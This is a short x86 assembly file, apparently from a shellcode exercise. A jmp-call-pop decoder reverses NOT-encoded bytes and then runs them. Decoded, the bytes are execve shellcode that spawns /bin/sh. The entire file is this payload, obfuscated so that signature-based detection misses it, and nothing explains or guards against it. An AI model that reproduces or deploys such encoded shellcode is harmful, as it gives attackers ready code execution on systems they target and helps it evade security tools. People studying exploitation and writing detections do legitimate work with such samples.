global _start

section .data   ; section .text does not allow writing of data onto it

_start:
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
    jmp short encoded    

decoder:
    pop esi
    mov cl, 36
    
decode_shellcode:
    not byte [esi]
    inc esi
    loop decode_shellcode
    
    jmp short encoded_shellcode

encoded:
    call decoder
    encoded_shellcode: db 0xce,0x3f,0xce,0x24,0xce,0x36,0xce,0x2d,0x4f,0xf4,0xac,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xae,0xac,0x76,0x1e,0x32,0x7f,0xce,0x3f,0xbf,0xce,0x24,0x32,0x7f
